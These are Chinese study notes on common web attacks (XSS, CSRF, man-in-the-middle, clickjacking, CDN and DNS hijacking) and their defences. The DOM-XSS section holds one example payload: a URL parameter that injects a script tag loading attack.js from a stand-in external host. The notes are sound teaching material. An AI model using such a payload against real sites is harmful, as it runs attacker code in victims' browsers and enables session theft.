
## web safe

常见的 web 前端安全攻击方式：
- xss 跨站脚本攻击
- csrf 跨站请求伪造
- MITM 中间人攻击

other:
- SQL 注入
- 点击劫持
- DOS
  - SYN泛洪攻击
- http网络劫持
- CDN 劫持
- SSl剥离

## XSS

跨站脚本攻击: 
在网页中插入恶意的js脚本， 当用户浏览时，就会触发脚本, 造成xss攻击    

### 分类
- 反射型
- 存储型
- DOM型

#### 反射型

用户输入的注入代码 通过浏览器传入到服务器后，又被反射回来，在浏览器中解析执行

demo: 表单输入 `<script src >` 然后回来执行 
电子邮件？ 聊天软件?

#### 存储型
用户输入的注入代码，通过传输，被永久春芳到了目标服务器的数据库或文件中，用户再次访问这个注入代码的页面就出现了

博客论坛留言板

#### DOM型
通过修改页面的dom结构

例子：

攻击者诱导被害者打开链接` hzfe.org?name=<script src="http://a.com/attack.js"/>`。

被攻击网站前端取出 URL 的 name 字段后未经转义直接通过 innerHTML 渲染到页面中。

被害者在不知情的情况下，执行了攻击者注入的脚本。


### 危害 

1. 劫持用户cookie，通过在网页中写入并执行文件，劫持用户浏览器，将用户当前使用的sessionID信息发送至攻击者控制的网站或服务器
2. 利用 iframe frame XHR Flash等，以用户的身份执行一些动作
3. 利用植入flash 通过crossdomain权限设置进一步获取更改权限，或利用java等得到类似操作
4. 挂马
5. 蠕虫
6. 有局限性的键盘记录

### 防范
1. 对外部的输入进行过滤编码和转译
2. 设置 cookie httpOnly 属性, 禁止js读取cookie
3. 开启CSP content security policy, 内容安全策略 ，规定浏览器只能执行特定来源的代码 



## csrf
跨站请求伪造

攻击者盗用用户身份，以用户身份发送恶意请求 

如：在第三方网站上直接放一个img， 就会盗用这个img链接相关的cookie从而发起请求

### 防范

阻止不明外域的访问
  <!-- 同源检测(referer 部分IE存在问题) -->
  Samesite Cookie
提交时要求附加本域才能获取的信息
  CSRF Token
  双重Cookie验证

1. csrf token
  在用户请求时需要加入token， 进行身份验证
    - 问题，大型网站添加seesion存储会增加服务器压力
2. http header中添加自定义属性并验证
3. 添加白名单，仅允许安全域名请求
4. 增加验证码验证
5. cookie设置 SameSite 属性，



## MITM 

中间人攻击

主要有两个阶段： 拦截和解密

### 拦截

在用户数据未到达目标设备前拦截，分为主动和被动

1. 主动
  - APR欺骗: 
  - DNS: 冒充域名服务器，将IP进行转发
2. 被动:
  免费的wifi热点 


### 解密

- ssl劫持伪造证书
- ssl剥离
- 将https降级为http转给用户使用 


### 防范

- 对开发者:
  - 支持https
  - 开启 hsts 策略，有个缺点是用户首次访问时因还未收到 HSTS 响应头而不受保护
- 对用户
  - 尽可能是用 https  
  - 避免不知名不安全wifi  
  - 不忽略不安全的浏览器通知 
  - 公共网络下不进行涉及敏感信息交互 
  - 用可信的第三方CA厂商
  - 不下载不明来源的证书 

## other

### 点击劫持

*http header*: ```X-Frame-Options```
  - DENY: 始终禁止在 iframe 中显示此页面，即便是同域名下的页面也不允许嵌套。
  - SAMEORIGIN: 只允许与页面同源的iframe中显示页面。
  - ALLOW-FROM url: 允许指定域的iframe中显示页面（已废弃，不推荐使用）

### CDN 劫持

产生:
  - 基于DNS的劫持
  - 互联网路由协议劫持
  - 攻击者可以通过欺骗或篡改CDN节点内容


防范:
- 通过 SRI 解决
  - 通过给 link 标签或者 script 标签增加 integrity 属性即可开启 SRI 功能， 验证子资源完整性
- 全链路https
- 回源操作直接使用ip，避免源路被dns劫持


### DNS 劫持

产生:
  - 本机dns劫持
  - 路由dns劫持
  - 攻击dns服务器

防范:
  - 

### http劫持

- 运营商HTTP劫持

防范：
- https

